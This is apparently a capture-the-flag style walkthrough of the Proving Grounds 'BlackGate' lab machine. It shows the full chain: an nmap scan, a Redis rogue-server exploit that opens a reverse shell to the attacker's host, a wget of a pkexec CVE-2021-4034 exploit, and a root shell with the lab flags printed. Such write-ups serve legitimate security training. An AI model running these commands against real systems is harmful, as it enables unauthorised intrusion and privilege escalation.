---

categories: [ Proving Grounds, Practice ]
tags: [ redis, Public Exploit, pkexec, PrivEsc]
media_subpath: /assets/images/
image:
  path: "Pasted image 20240615220503.png"
  width: "1200"
  height: "630"
  alt: Linux Hard Level Machine
description: Proving Ground Practice Hard Level Machine ! You gona learn about Redis.
---

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Practice/BlackGate]
└─$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt 192.168.182.176

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDErzUX3Jeg2oRWhqelAA3/QrsFYoyDVaXbJK0ghZTX1i3mZY8SXopUZC09JD/6S+Ye+nFW2/6rnXHltIVWEALmPDrlDOV5m+LGujzXqc5YJcylNnwSjz9TjCHlPa+PrMdyp2NyT+Wt2w6jhVWA1sowq8R4ZDkqvpQwz9rUOVk5IRiV6fgdEuHBBXKQZu9S00iPNC5hhfmclk5k2dPtFqQRlosZfjDjv5E8Zo8YwLGonmWciNQQB8DWX47R08noPMseQMYR707ABcIgx4+DKMZ7/HlOzqwoqFdyvMSdPf5lz+cPG/aI0N6qua80uxbXg0rvMNQuZd73d5jA+Yp3eIkI4lHQqjXO4B0Gbl4lpcHTWCdUI93dLbBy13J0NdTG+vqkXszDBXr19rWaD+yeXg8FQt5ViHr7N/Pr77zFjOiAq4AjRNt6j8e+kX0Cqwov1RwUc4R1JPfmEIZqm8Ds/z+jDhkhLoJP4yjE8xNHhOz8lUk+bZh3zGuS3+97Mrkh3Rs=
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPed4/WiZ+RjcALVwQnLf74Byu1yb40zjCfDT+DBa4jiTzciU5Ql1fhEzanZGgt5VuK0y5ZAgG7f54yL9iVcaU8=
|   256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJLFhMCuSltbhF2Mj0Xz0A3ZSEhcu8LOF9hX8bqGirVH
6379/tcp open  redis   syn-ack ttl 61 Redis key-value store 4.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}
## Redis Enumeration (Port 6379) ⤵️

Lets enumerate on Redis with this Tool 🔻

https://github.com/n0b0dyCN/redis-rogue-server

```bash
┌──(kali㉿kali)-[~/…/Proving_Ground/Practice/BlackGate/redis-rogue-server]
└─$ python3 redis-rogue-server.py --rhost 192.168.182.176 --lhost 192.168.45.214
______         _ _      ______                         _____    
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                      
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.182.176:6379
[info] SERVER 192.168.45.214:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: r
[info] Open reverse shell...
Reverse server address: 192.168.45.214
Reverse server port: 2222
[info] Reverse shell payload sent.
[info] Check at 192.168.45.214:2222
[info] Unload module...


```
{: .nolineno}

I got a connection callback on port 2222 lets enumerate further now 🔻

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Practice/BlackGate]
└─$ rlwrap nc -lvnp 2222
listening on [any] 2222 ...


id
python3 -c 'import pty;pty.spawn("/bin/bash");'
export TERM=xterm
Ctrl + z
stty raw -echo ; fg
reset

connect to [192.168.45.214] from (UNKNOWN) [192.168.182.176] 47690
uid=1001(prudence) gid=1001(prudence) groups=1001(prudence)
prudence@blackgate:/tmp$ whoami
whoami
prudence
prudence@blackgate:/tmp$ id
id
uid=1001(prudence) gid=1001(prudence) groups=1001(prudence)
prudence@blackgate:/tmp$ 
```
{: .nolineno}

I checked the <span style="color:#0daece">sudoers</span> privileges and I got this `redis-status` command that can lets me a root user.

```bash
prudence@blackgate:/tmp$ sudo -l
sudo -l
Matching Defaults entries for prudence on blackgate:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prudence may run the following commands on blackgate:
    (root) NOPASSWD: /usr/local/bin/redis-status
prudence@blackgate:/tmp$
```
{: .nolineno}

But this require reverse-engineering so I have to find another way to move forward lets see 🔻

```bash
prudence@blackgate:/tmp$ sudo -V
sudo -V
Sudo version 1.9.1
Sudoers policy plugin version 1.9.1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.1
Sudoers audit plugin version 1.9.1
prudence@blackgate:/tmp$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/snap/core20/1405/usr/bin/chfn
/snap/core20/1405/usr/bin/chsh
/snap/core20/1405/usr/bin/gpasswd
/snap/core20/1405/usr/bin/mount
/snap/core20/1405/usr/bin/newgrp
/snap/core20/1405/usr/bin/passwd
/snap/core20/1405/usr/bin/su
/snap/core20/1405/usr/bin/sudo
/snap/core20/1405/usr/bin/umount
/snap/core20/1405/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1405/usr/lib/openssh/ssh-keysign
/snap/snapd/15177/usr/lib/snapd/snap-confine
/snap/core18/1885/bin/mount
/snap/core18/1885/bin/ping
/snap/core18/1885/bin/su
/snap/core18/1885/bin/umount
/snap/core18/1885/usr/bin/chfn
/snap/core18/1885/usr/bin/chsh
/snap/core18/1885/usr/bin/gpasswd
/snap/core18/1885/usr/bin/newgrp
/snap/core18/1885/usr/bin/passwd
/snap/core18/1885/usr/bin/sudo
/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1885/usr/lib/openssh/ssh-keysign
/snap/core18/2344/bin/mount
/snap/core18/2344/bin/ping
/snap/core18/2344/bin/su
/snap/core18/2344/bin/umount
/snap/core18/2344/usr/bin/chfn
/snap/core18/2344/usr/bin/chsh
/snap/core18/2344/usr/bin/gpasswd
/snap/core18/2344/usr/bin/newgrp
/snap/core18/2344/usr/bin/passwd
/snap/core18/2344/usr/bin/sudo
/snap/core18/2344/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2344/usr/lib/openssh/ssh-keysign
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/at
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/newgrp
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
```
{: .nolineno}

I checked the SUIDs and GUIDs , Turns out I got **pkexec** running on this machine lets check its version, If it is vulnerable then I will be using an unintended path to root the machine by exploiting pkexec like this 🔻

```
{: .nolineno}
prudence@blackgate:/tmp$ /usr/bin/pkexec --version
/usr/bin/pkexec --version
pkexec version 0.105
prudence@blackgate:/tmp$ wget http://192.168.45.214/pkexec_CVE-2021-4034.py
wget http://192.168.45.214/pkexec_CVE-2021-4034.py
--2024-06-15 16:24:58--  http://192.168.45.214/pkexec_CVE-2021-4034.py
Connecting to 192.168.45.214:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3067 (3.0K) [text/x-python]
Saving to: ‘pkexec_CVE-2021-4034.py’

pkexec_CVE-2021-403   0%[                    ]       0  --.-KB/s   pkexec_CVE-2021-403 100%[===================>]   3.00K  --.-KB/s    in 0s      

2024-06-15 16:24:59 (6.98 MB/s) - ‘pkexec_CVE-2021-4034.py’ saved [3067/3067]

prudence@blackgate:/tmp$ chmod +x pkexec_CVE-2021-4034.py
chmod +x pkexec_CVE-2021-4034.py
prudence@blackgate:/tmp$ python3 pkexec_CVE-2021-4034.py
python3 pkexec_CVE-2021-4034.py
Do you want to choose a custom payload? y/n (n use default payload)  

[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7f932eda1000 at 0x7f932e7c1340>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# whoami
whoami
root
# cd /root
cd /root
# ls -al
ls -al
total 32
drwx------  5 root root 4096 Jun 15 16:18 .
drwxr-xr-x 20 root root 4096 Dec  6  2021 ..
lrwxrwxrwx  1 root root    9 Dec  6  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Aug 14  2019 .bashrc
drwx------  2 root root 4096 Dec  6  2021 .cache
-rw-r--r--  1 root root  161 Sep 16  2020 .profile
drwxr-xr-x  2 root root 4096 Dec  6  2021 .ssh
-rw-------  1 root root   33 Jun 15 16:18 proof.txt
drwxr-xr-x  3 root root 4096 Dec  6  2021 snap
# cat proof.txt
cat proof.txt
dde6f9afbcae6b49c60cbd868c66283d
# cd /home
cd /home
# ls -al
ls -al
total 12
drwxr-xr-x  3 root     root     4096 Dec  6  2021 .
drwxr-xr-x 20 root     root     4096 Dec  6  2021 ..
drwxr-xr-x  2 prudence prudence 4096 Dec  6  2021 prudence
# cd prudence
cd prudence
# dir
dir
local.txt  notes.txt
# cat local.txt
cat local.txt
4ba549e4f04403fa3148ec258b5e2839
# cat notes.txt
cat notes.txt
[✔] Setup redis server
[✖] Turn on protected mode
[✔] Implementation of the redis-status
[✔] Allow remote connections to the redis server 
# 
```
{: .nolineno}

I am root now !!








> If you have any questions or suggestions, please leave a comment below.
> Thank You ! 
{: .prompt-tip }